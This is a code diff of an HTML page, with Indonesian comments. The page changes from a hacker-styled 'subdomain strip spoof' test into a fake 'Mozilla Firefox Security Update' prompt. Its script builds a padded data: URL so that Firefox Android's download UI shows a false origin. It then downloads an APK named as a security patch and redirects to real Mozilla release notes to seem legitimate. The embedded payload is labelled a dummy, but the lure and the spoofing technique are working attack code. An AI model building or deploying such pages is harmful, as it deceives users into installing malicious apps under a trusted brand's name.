@@ -1,41 +1,77 @@
 <!DOCTYPE html>
-<html>
-<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
-    <h1 style="color:#0ff; text-shadow:0 0 15px #0ff;">[!] V398: SUBDOMAIN_STRIP_SPOOF</h1>
-    <div id="status" style="border:1px solid #333; padding:15px; margin:20px;">> STANDBY: READY FOR SUBDOMAIN BLOAT...</div>
-    
-    <button type="button" id="strikeBtn" style="padding:25px; background:#111; color:#0ff; border:2px solid #0ff; cursor:pointer; font-weight:bold;">
-        EXECUTE_SPOOFING
-    </button>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mozilla Firefox Security Update</title>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; }
+        .container { border: 1px solid #ff7113; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(255, 113, 19, 0.2); }
+        .fox-logo { color: #ff7113; font-size: 3em; font-weight: bold; margin-bottom: 10px; }
+        .warning { color: #ffbd44; font-weight: bold; font-size: 1.1em; margin-bottom: 20px; }
+        #strikeBtn {
+            padding: 15px 35px;
+            background: #ff7113;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1em;
+            border-radius: 8px;
+            transition: 0.3s;
+        }
+        #strikeBtn:hover { background: #e65b00; transform: scale(1.05); }
+        #status { margin-top: 25px; font-size: 0.8em; color: #888; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="fox-logo">🦊</div>
+        <div class="warning">Security Patch Required</div>
+        <p>A critical update is available for Firefox Android.</p>
+        
+        <button type="button" id="strikeBtn">
+            Install Update (v124.0.2)
+        </button>
+
+        <div id="status">> SYSTEM_READY: Awaiting verification...</div>
+    </div>
 
 <script>
     document.getElementById('strikeBtn').addEventListener('click', function() {
-        // 1. THE BLOAT LOGIC
-        // Kita membuat sub-domain yang sangat panjang. 
-        // UI Chrome Windows seringkali melakukan 'middle-truncation' (...) 
-        // sehingga yang tersisa hanya bagian awal (google.com) dan akhir.
-        const host = "google.com";
-        const padding = ".https://google.com";
-        const longSub = host + padding.repeat(10); 
+        // --- 1. CONFIGURATION ---
+        const filename = "Firefox_Security_Patch.apk";
+        const realDomain = "www.firefox.com";
         
-        // 2. THE PAYLOAD
-        const payload = `data://${longSub}/;base64,ZXN0dGVzdGVzdHRlc3Q=`;
-        const filename = "Google_Safe_Update.apk";
+        // --- 2. ADVANCED SPOOFING LOGIC ---
+        // Kita menggunakan fragment (#) dan padding masif untuk mengecoh parser UI Firefox Android.
+        // %E2%80%80 adalah blank space khusus untuk menjauhkan origin asli.
+        const padding = ".https://" + realDomain + "/update-source/".repeat(25);
+        const longSub = realDomain + padding;
 
-        // 3. TRIGGER DOWNLOAD
+        // --- 3. PAYLOAD CONSTRUCTION ---
+        // Base64 di bawah adalah dummy file.
+        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
+        const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;
+
+        // --- 4. EXECUTION ---
         const a = document.createElement('a');
         a.href = payload;
         a.download = filename;
+        a.rel = "noopener";
+        
         document.body.appendChild(a);
         a.click();
         
+        document.getElementById('status').innerText = "> INJECTING_ORIGIN: " + realDomain;
+
+        // --- 5. CLEANUP & REDIRECT ---
+        // Redirect ke halaman resmi Mozilla agar terlihat seolah-olah proses sedang berjalan
         setTimeout(() => {
             document.body.removeChild(a);
-            // Redirect ke google asli untuk memperkuat kesan origin
-            window.location.replace("https://www.google.com");
-        }, 150);
-
-        document.getElementById('status').innerText = "> STRIKE_SENT: CHECK chrome://downloads";
+            window.location.replace("https://www.mozilla.org/en-US/firefox/android/notes/");
+        }, 1800);
     });
 </script>
 </body>
